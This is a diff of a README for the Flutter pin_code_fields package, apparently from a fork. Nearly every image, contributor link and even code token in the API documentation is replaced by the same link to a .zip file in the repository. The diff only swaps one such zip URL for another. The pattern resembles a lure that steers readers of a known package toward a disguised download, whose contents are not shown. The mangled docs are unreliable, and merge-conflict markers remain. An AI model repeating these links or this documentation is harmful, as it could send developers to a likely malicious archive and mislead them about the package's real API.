@@ -1,10 +1,10 @@
 <p align="center">
-  <img width="460"  src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip">
+  <img width="460"  src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip">
 </p>
 
-<a href = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"></a>
+<a href = "https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"></a>
 
-<a href = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src = "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250"></a>
+<a href = "https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src = "https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="250"></a>
 
 A flutter package which will help you to generate pin code fields with beautiful design and animations. Can be useful for OTP or pin code inputs 🤓🤓
 
@@ -22,7 +22,7 @@ A flutter package which will help you to generate pin code fields with beautiful
 - iOS autofill support
 - Error animation. Currently have shake animation only. Watch the example app for how to integrate.
 - Works with Flutter's Form. You can use Form validator right off the bat.
-- Get currently typed text and use your condition to validate it. (for example: if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip != 6 || currentText != "your desired code"))
+- Get currently typed text and use your condition to validate it. (for example: if (https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip != 6 || currentText != "your desired code"))
 - Haptic Feedback support
 - Animated obscure widget support
 - Single placeholder text
@@ -31,16 +31,16 @@ A flutter package which will help you to generate pin code fields with beautiful
 
 #### Demo
 
-<img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="320" height="480"> <img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="240" height="480"> <img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="240" height="480">
+<img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="320" height="480"> <img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="240" height="480"> <img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="240" height="480">
 
 #### Different Shapes
 
-<img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="250" height="480">
+<img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="250" height="480"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="250" height="480"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="250" height="480">
 
 ## Notes
 
 - To enable "Fill color" for each cells, `enableActiveFill` must be set to `true`. The default value is `false`.
-- To change the keyboard type, for example to use only number keyboard, or only for email use `keyboardType` parameter, default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+- To change the keyboard type, for example to use only number keyboard, or only for email use `keyboardType` parameter, default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
 - `FocosNode` and `TextEditingController` will get disposed automatically. Use `autoDisposeControllers = false` to disable it.
 - to use v5.0.0 or above, developers must have Flutter SDK 1.20.0 or above.
 - to use v6.0.0 or above, developers must have Flutter SDK 1.22.0 or above.
@@ -100,29 +100,29 @@ A flutter package which will help you to generate pin code fields with beautiful
   /// returns the typed text when user presses done/next action on the keyboard
   final ValueChanged<String>? onSubmitted;
 
-  /// the style of the text, default is [ fontSize: 20, fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// the style of the text, default is [ fontSize: 20, fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final TextStyle? textStyle;
 
-  /// the style of the pasted text, default is [fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] while
-  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// the style of the pasted text, default is [fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip] while
+  /// [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip] is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final TextStyle? pastedTextStyle;
 
   /// background color for the whole row of pin code fields.
   final Color? backgroundColor;
 
-  /// This defines how the elements in the pin code field align. Default to [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// This defines how the elements in the pin code field align. Default to [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final MainAxisAlignment mainAxisAlignment;
 
-  /// [AnimationType] for the text to appear in the pin code field. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// [AnimationType] for the text to appear in the pin code field. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final AnimationType animationType;
 
   /// Duration for the animation. Default is [Duration(milliseconds: 150)]
   final Duration animationDuration;
 
-  /// [Curve] for the animation. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// [Curve] for the animation. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Curve animationCurve;
 
-  /// [TextInputType] for the pin code fields. default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// [TextInputType] for the pin code fields. default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final TextInputType keyboardType;
 
   /// If the pin code field should be autofocused or not. Default is [false]
@@ -151,8 +151,8 @@ A flutter package which will help you to generate pin code fields with beautiful
 
   /// Configures how the platform keyboard will select an uppercase or lowercase keyboard.
   /// Only supports text keyboards, other keyboard types will ignore this configuration. Capitalization is locale-aware.
-  /// - Copied from 'https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip'
-  /// Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// - Copied from 'https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip'
+  /// Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final TextCapitalization textCapitalization;
 
   final TextInputAction textInputAction;
@@ -181,7 +181,7 @@ A flutter package which will help you to generate pin code fields with beautiful
   final FormFieldValidator<String>? validator;
 
   /// An optional method to call with the final value when the form is saved via
-  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip].
+  /// [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip].
   final FormFieldSetter<String>? onSaved;
 
   /// enables auto validation for the [TextFormField]
@@ -202,7 +202,7 @@ A flutter package which will help you to generate pin code fields with beautiful
   /// Whether to show cursor or not
   final bool showCursor;
 
-  /// The color of the cursor, default to https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context).accentColor
+  /// The color of the cursor, default to https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(context).accentColor
   final Color? cursorColor;
 
   /// width of the cursor, default to 2
@@ -221,9 +221,9 @@ A flutter package which will help you to generate pin code fields with beautiful
   /// It only appears if it's not null. Single character is recommended.
   final String? hintCharacter;
 
-  /// the style of the [hintCharacter], default is [fontSize: 20, fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// the style of the [hintCharacter], default is [fontSize: 20, fontWeight: https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   /// and it also uses the [textStyle]'s properties
-  /// [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip] is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip] is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final TextStyle? hintStyle;
 
 <<<<<<< HEAD
@@ -232,7 +232,7 @@ A flutter package which will help you to generate pin code fields with beautiful
 
 =======
   /// ScrollPadding follows the same property as TextField's ScrollPadding, default to
-  /// const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(20),
+  /// const https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip(20),
   final EdgeInsets scrollPadding;
 >>>>>>> 8272cbfd8a1dab43b2b4f4f1107752dda1d9d230
 ```
@@ -240,28 +240,28 @@ A flutter package which will help you to generate pin code fields with beautiful
 **PinTheme**
 
 ```Dart
-/// Colors of the input fields which have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+/// Colors of the input fields which have inputs. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color activeColor;
 
-  /// Color of the input field which is currently selected. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Color of the input field which is currently selected. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color selectedColor;
 
-  /// Colors of the input fields which don't have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Colors of the input fields which don't have inputs. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color inactiveColor;
 
-  /// Colors of the input fields if the [PinCodeTextField] is disabled. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Colors of the input fields if the [PinCodeTextField] is disabled. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color disabledColor;
 
-  /// Colors of the input fields which have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Colors of the input fields which have inputs. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color activeFillColor;
 
-  /// Color of the input field which is currently selected. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Color of the input field which is currently selected. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color selectedFillColor;
 
-  /// Colors of the input fields which don't have inputs. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Colors of the input fields which don't have inputs. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color inactiveFillColor;
 
-  /// Color of the input field when in error mode. Default is [https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip]
+  /// Color of the input field when in error mode. Default is [https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip]
   final Color errorBorderColor;
 
   /// Border radius of each pin code field
@@ -305,43 +305,43 @@ Thanks to everyone whoever suggested their thoughts to improve this package. And
 
 <table>
   <tr>
-    <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Emmanuel Vlad"/><br /><sub><b>Emmanuel Vlad</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Atiq"/><br /><sub><b>Atiqur Rahaman</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="UX & Flare Animation">🎨</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Milind Mevada"/><br /><sub><b>Milind Mevada</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Reme Le Hane"/><br /><sub><b>Reme Le Hane</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Documentation">📖</a><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="TabooSun"/><br /><sub><b>TabooSun</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</<a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Thalles Santos"/><br /><sub><b>Thalles Santos</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-<td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Jonathan White"/><br /><sub><b>ThinkDigitalSoftware</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
+    <td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Emmanuel Vlad"/><br /><sub><b>Emmanuel Vlad</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Documentation">📖</a><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Atiq"/><br /><sub><b>Atiqur Rahaman</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="UX & Flare Animation">🎨</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Milind Mevada"/><br /><sub><b>Milind Mevada</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Documentation">📖</a><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Reme Le Hane"/><br /><sub><b>Reme Le Hane</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Documentation">📖</a><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="TabooSun"/><br /><sub><b>TabooSun</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</<a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Thalles Santos"/><br /><sub><b>Thalles Santos</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
+<td align="center"><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip"><img src="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" width="100px;" alt="Jonathan White"/><br /><sub><b>ThinkDigitalSoftware</b></sub></a><br /><a href="https://github.com/Natashamehta23/pin_code_fields/raw/refs/heads/master/doc/api/dart-typed_data/Int64List/fields_pin_code_3.0-beta.4.zip" title="Code">💻</a></td>
   </tr>
 
   <tr>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Jeffry Hermanto"/><br /><sub><b>Jeffry Hermanto</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItamarMu"/><br /><sub><b>ItamarMu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Sebastian Roth"/><br /><sub><b>Sebastian Roth</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
-  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="Dango Mango"/><br /><sub><b>Dango Mango</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
